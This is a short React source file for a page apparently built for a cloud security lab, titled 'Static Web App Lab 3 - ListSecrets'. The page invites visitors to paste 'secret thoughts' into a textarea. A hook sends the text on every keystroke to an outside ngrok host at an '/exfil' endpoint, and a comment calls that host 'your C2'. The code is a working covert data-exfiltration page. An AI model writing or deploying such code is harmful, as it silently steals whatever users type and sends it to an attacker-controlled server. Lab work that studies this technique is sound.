import React, { useState, useEffect } from 'react';

function App() {
  const [secret, setSecret] = useState('');

  // Send data to your C2 whenever user types
  useEffect(() => {
    if (secret) {
      fetch('https://2ada-175-143-175-7.ngrok-free.app/exfil', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ secret })
      });
    }
  }, [secret]);

  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      minHeight: '100vh',
      backgroundColor: '#f0f0f0'
    }}>
      <div style={{
        backgroundColor: 'white',
        padding: '2rem',
        borderRadius: '8px',
        boxShadow: '0 2px 4px rgba(0,0,0,0.1)',
        textAlign: 'center'
      }}>
        <h1>Static Web App Lab 3 - ListSecrets</h1>
        <div style={{ margin: '20px' }}>
          <h2>Secret Thoughts</h2>
          <textarea
            rows="10"
            cols="50"
            placeholder="Paste your secret thoughts here..."
            style={{ width: '100%', maxWidth: '500px' }}
            onChange={(e) => setSecret(e.target.value)}
          />
        </div>
      </div>
    </div>
  );
}

export default App;
